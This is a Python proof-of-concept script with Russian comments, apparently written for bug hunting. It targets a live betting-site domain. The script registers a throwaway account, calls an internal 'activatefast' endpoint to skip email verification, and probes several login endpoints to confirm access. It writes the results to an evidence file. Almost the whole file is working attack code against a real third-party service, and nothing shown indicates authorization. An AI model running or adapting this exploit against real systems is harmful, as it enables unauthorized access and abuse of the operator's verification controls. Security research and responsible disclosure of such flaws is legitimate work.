# bug2_poc.py
import requests
import json
import time

BASE = "https://1xlite-03801.world"
HEADERS = {
    "Content-Type": "application/json",
    "Origin": BASE,
    "User-Agent": "Mozilla/5.0"
}

# шаг 1 - регистрация нового аккаунта
import random, string
rand_email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@mailinator.com"
rand_pass = "Test" + ''.join(random.choices(string.digits, k=6)) + "!"

print(f"регистрирую аккаунт: {rand_email}")
reg_body = {
    "email": rand_email,
    "password": rand_pass,
    # добавь другие поля если требует форма регистрации
}

# попробуй стандартные эндпоинты регистрации
for reg_path in ["/web-api/api/v1/user/register", "/web-api/api/internal/v1/user/register", "/web-api/auth/register"]:
    r = requests.post(BASE + reg_path, json=reg_body, headers=HEADERS)
    print(f"{reg_path}: {r.status_code} | {r.text[:100]}")
    if r.status_code in [200, 201]:
        try:
            data = r.json()
            user_id = data.get("userId") or data.get("id") or data.get("user", {}).get("id")
            if user_id:
                print(f"получен userId: {user_id}")
                break
        except Exception:
            pass

# шаг 2 - если userId получен через интерфейс вставь его сюда
USER_ID = int(input("\nвставь userId нового аккаунта (из ответа или из интерфейса): "))

print(f"\nпытаюсь активировать userId={USER_ID} без верификации email...")
act_r = requests.post(
    BASE + "/web-api/api/internal/v1/user/activatefast",
    json={"userId": USER_ID},
    headers=HEADERS
)
print(f"статус активации: {act_r.status_code}")
print(f"server-timing: {act_r.headers.get('Server-Timing', '')}")
print(f"тело: {act_r.text or '(пустое)'}")

# шаг 3 - попробовать войти без подтверждения email
print(f"\nпытаюсь войти в аккаунт {rand_email} без подтверждения email...")
for login_path in ["/web-api/auth/login", "/web-api/api/v1/user/login", "/web-api/api/internal/v1/user/login"]:
    login_r = requests.post(
        BASE + login_path,
        json={"email": rand_email, "password": rand_pass},
        headers=HEADERS
    )
    print(f"{login_path}: {login_r.status_code} | {login_r.text[:150]}")
    if login_r.status_code == 200:
        print("\n=== КРИТИЧНО: вход в неверифицированный аккаунт успешен! ===")
        with open("bug2_evidence.json", "w") as f:
            json.dump({
                "email": rand_email,
                "userId": USER_ID,
                "activation_status": act_r.status_code,
                "login_status": login_r.status_code,
                "login_response": login_r.json()
            }, f, indent=2)
        print("сохранено в bug2_evidence.json")
        break
